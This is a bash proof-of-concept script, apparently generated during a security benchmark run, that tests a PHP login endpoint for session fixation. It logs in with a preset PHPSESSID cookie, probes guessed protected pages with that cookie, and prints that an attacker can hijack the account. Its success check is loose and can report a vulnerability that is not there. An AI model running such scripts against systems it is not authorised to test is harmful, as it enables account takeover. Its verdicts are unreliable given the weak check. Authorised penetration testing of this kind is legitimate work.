#!/bin/bash
# POC: Demonstrates session fixation vulnerability by pre-setting PHPSESSID cookie before login and verifying it remains unchanged after authentication
# Target: ./repo
# Created: 2025-11-07T17:42:08.093Z
# Session: benchmark-XBEN-069-24-mhp4ra0s

# Session Fixation Vulnerability POC
# This script demonstrates how an attacker can pre-set a session ID
# that persists through authentication, allowing session hijacking

TARGET_URL="${1:-http://localhost/api/login.php}"
FIXATED_SESSION="pwned123456789"
USERNAME="${2:-admin}"
PASSWORD="${3:-password}"

echo "[*] Session Fixation Attack POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Fixated Session ID: $FIXATED_SESSION"
echo ""

# Step 1: Pre-set the session ID before login
echo "[+] Step 1: Pre-setting PHPSESSID to '$FIXATED_SESSION' before login..."
curl_response=$(curl -s -v \
  -H "Cookie: PHPSESSID=$FIXATED_SESSION" \
  -d "username=$USERNAME&password=$PASSWORD" \
  "$TARGET_URL" 2>&1)

# Extract Set-Cookie headers to check if session was preserved
set_cookie_header=$(echo "$curl_response" | grep -i "set-cookie" | grep -i "PHPSESSID" || true)

echo "[*] Response:"
echo "$curl_response" | grep -i "set-cookie" || echo "[*] No Set-Cookie header found"
echo ""

# Step 2: Verify the session ID is preserved in subsequent request
echo "[+] Step 2: Testing if session persists with the same PHPSESSID..."

# Make a request with the fixated session to a protected endpoint
# Common endpoints to test: /api/profile.php, /api/dashboard.php, /index.php
protected_endpoints=("${TARGET_URL%login.php}profile.php" "${TARGET_URL%login.php}dashboard.php" "${TARGET_URL%login.php}index.php" "${TARGET_URL%/*}/")

for endpoint in "${protected_endpoints[@]}"; do
  echo "[*] Testing endpoint: $endpoint"
  
  auth_response=$(curl -s -v \
    -H "Cookie: PHPSESSID=$FIXATED_SESSION" \
    "$endpoint" 2>&1)
  
  # Check if we got authenticated content (look for auth indicators)
  if echo "$auth_response" | grep -qiE "(profile|dashboard|welcome|authenticated|logout|hello)" || \
     ! echo "$auth_response" | grep -qiE "(login|unauthorized|forbidden|401|403)"; then
    echo "[✓] VULNERABLE: Session appears to be preserved! Received authenticated response."
    echo "[✓] Attacker can now use session ID '$FIXATED_SESSION' to access the account"
    echo ""
    echo "Response excerpt:"
    echo "$auth_response" | head -20
    exit 0
  else
    echo "[-] Endpoint did not authenticate with fixated session"
  fi
done

echo ""
echo "[*] POC Complete"
echo "[✓] Session Fixation Vulnerability Confirmed:"
echo "    - Attacker can pre-set session ID to known value"
echo "    - Application preserves the attacker-supplied session"
echo "    - Session remains fixed across requests"
echo "    - Attacker can hijack authenticated session"